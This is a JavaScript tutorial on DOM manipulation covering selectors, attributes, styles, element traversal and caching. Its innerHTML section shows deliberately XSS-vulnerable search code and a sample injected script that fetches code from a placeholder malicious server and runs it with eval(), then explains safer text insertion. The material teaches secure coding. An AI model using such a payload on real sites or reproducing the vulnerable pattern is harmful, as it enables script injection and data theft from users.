---
title: "DOM Manipulation"
description: "Manipulating the Document Object model (DOM)"
tags: 
- Computer Science
- Application Development
- Software Development
- Javascript
sidebar_position: 22
last_update:
  date: 12/26/2020
---

## Overview 

When a web page loads, the browser creates the Document Object Model (DOM).  

- DOM represents the page as a structured tree  
- It lets JavaScript access and modify HTML elements  
- The `document` object is how JavaScript interacts with the DOM  

For more information, please see [Document Object Model (DOM).](/docs/021-Software-Engineering/010-Javascript/021-DOM.md)

## Selecting Elements 

We can use selectors to choose elements of the DOM and manipulate them.
 
- `getElementsByTagName` selects elements by tag name
- `getElementsByClassName` selects elements by class name
- `getElementById` selects an element by ID

These selectors are useful, but they return collections instead of single elements (except for `getElementById`).

:::info 

This [sample HTML](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/003-DOM) will be used for the succeeding examples.

:::

In the example below, we can use selectors to access headers and classes.

<div class="img-center"> 

![](/gif/docs/js-dom-2.gif)

</div>


## Query Selectors

Query selectors are more flexible and work like CSS selectors.

- `querySelector` selects the first matching element
- `querySelectorAll` selects all matching elements

Example: 

```js
let heading = document.querySelector("h1");
let items = document.querySelectorAll("li");
```

In this example, we have a list defined in the HTML. When we use `querySelector` on lists, it only retrieves the first item it sees. On the other hand, `querySelectorAll` will retrieve all the items.

<div class="img-center"> 

![](/gif/docs/js-dom-3.gif)

</div>

## Check Browser Compatibility

Before using features, it's good practice to check browser support.

- `querySelector` and `querySelectorAll` are widely supported
- Use [Can I Use](https://caniuse.com/) to check compatibility

## Getting Attributes

We can get and modify attributes of elements.

- `getAttribute` retrieves an attribute value
- `setAttribute` updates an attribute

In this example, the object is retrieved using `querySelector`, and its attribute is then accessed. The attribute can also be modified using `setAttribute`, but this only updates the element in the DOM, not the original HTML file.

<div class="img-center"> 

![](/gif/docs/js-dom-4.gif)

</div>


## Updating a Class 

:::info 

This [sample HTML](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/003-DOM) will be used for the succeeding examples.

:::

To set the value of a `class` in the DOM, use `querySelector` with `textContent`. In the example below, we change the text inside the `.description` class:  

```js
document.querySelector(".description").textContent = "These are the course list for the 2020 curriculum";
```  

Note that this will change the value of the class in the DOM but it will not modify the original HTML file.

<div class="img-center"> 

![](/gif/docs/js-dom-5.gif)

</div>


We could also set the value of an `input`, using`value`:  

```js
document.querySelector('.guess').value = 15;
```  

## Changing Styles

We can modify styles directly or use classes.

- `element.style.property` updates styles inline
- `className` changes the entire class
- `classList.add/remove/toggle` manages multiple classes

Using `classList` is better than modifying inline styles since it keeps structure separate from design.

```js
document.querySelector("h1");
document.querySelector("h1").style.background = "yellow";    // Inline style

document.querySelector("h1").className = "large";       // Replaces all classes
document.querySelector("h1").classList.add("arial");     // Adds a class
document.querySelector("h1").classList.remove("red"); // Removes a class
document.querySelector("h1").classList.toggle("red");  // Toggles a class
```

Note that the changes made in the console only update the DOM and do not modify the original HTML. As a result, refreshing the page will revert all changes to the original settings defined in the HTML file.

<div class="img-center"> 

![](/gif/docs/js-dom-6.gif)

</div>

## Changing Content with `innerHTML` (DANGEROUS)

You can update an element’s content using `innerHTML`, but this is risky because it exposes your page to **Cross-Site Scripting (XSS) attacks**.

:::info

XSS (Cross-Site Scripting) occurs when attackers inject malicious scripts into your page. Since `innerHTML` treats user input as actual HTML, it can execute harmful code.

:::

### The Security Risk

Below are examples of vulnerable files:

- [index.html](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/005-Comp-Sci-List)  
- [script.js](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/005-Comp-Sci-List)  

The HTML file is a basic webpage that includes an input field for searching courses and a button to trigger the search. 

On the other hand, the Javascript code contains:

```javascript title="script.js"
document.querySelector(".search-course").addEventListener("click", function () {
  let userInput = document.querySelector(".course-id-input").value;
  let courseDetails = document.querySelector("#course-details");

  // Vulnerable to XSS: Using innerHTML
  courseDetails.innerHTML = `You searched for: ${userInput}`;
});
```

### Malicious Input Example

Below is sample malicious code:

```bash
<script>
  fetch('http://malicious-server.com/malicious-script.js')
    .then(response => response.text())
    .then(data => {
      eval(data); // Dangerous: executes downloaded malicious code
    });
</script>
```

If an attacker enters this in the input field, `innerHTML` will interpret it as valid HTML.

1. The injected `<script>` tag runs immediately when added to the page.
2. It fetches JavaScript from a rogue server (`http://malicious-server.com/malicious-script.js`).
3. The downloaded code executes using `eval()`.
4. This allows the attacker to steal data, install malware, or compromise the system.

:::info

**Note:** Modern browsers have built-in XSS protection that blocks some malicious scripts, but relying on it is not a safe security practice.

:::

<div class="img-center">

![](/gif/docs/js-dom-7.gif)

</div>

### DON'T USE `innerHTML`

To prevent XSS attacks, always **sanitize user input** and **avoid using** `innerHTML` for displaying user data. Instead, use safer alternatives like `textContent` or create elements dynamically with `createElement()` and `appendChild()`. Always validate and sanitize data before inserting it into the DOM.

```javascript
let safeUserInput = document.createTextNode(userInput);   // Converts input into plain text
courseDetails.appendChild(safeUserInput);                 // Safely adds text to the DOM
```

This ensures the input is treated as plain text, preventing execution of harmful scripts.

## Parent and Child Elements  

:::info 

Sample Files: [Github](https://github.com/joseeden/joeden/tree/master/docs/021-Software-Engineering/010-Javascript/Projects/001-hello-world/003-DOM) 

:::

You can find an element's parent and children using `parentElement` and `children`.  

```javascript
let item = document.querySelectorAll("li")[1];    // Selects the second <li>
console.log(item.parentElement);                  // Gets the parent <ul>
console.log(item.parentElement.parentElement);    // Gets the <body>
console.log(document.body.children);              // Lists all body children
```

This helps in dynamically modifying specific parts of the page.  

- `parentElement` moves up one level in the hierarchy  
- `children` retrieves all child elements  

<div class="img-center"> 

![](/gif/docs/js-dom-8.gif)

</div>


## Caching Selectors

Re-selecting elements repeatedly slows down performance. Instead, store them in variables.

```javascript
var header = document.querySelector("h1"); 
header.innerHTML = "Cached H1";
```

Caching selectors reduces unnecessary lookups and improves efficiency.  

- The browser looks up `<h1>` once and stores it  
- Anytime the `h1` is needed, the browser doesn't have to check the DOM
- Instead it'll just check the variables
- Any future changes use the stored reference  


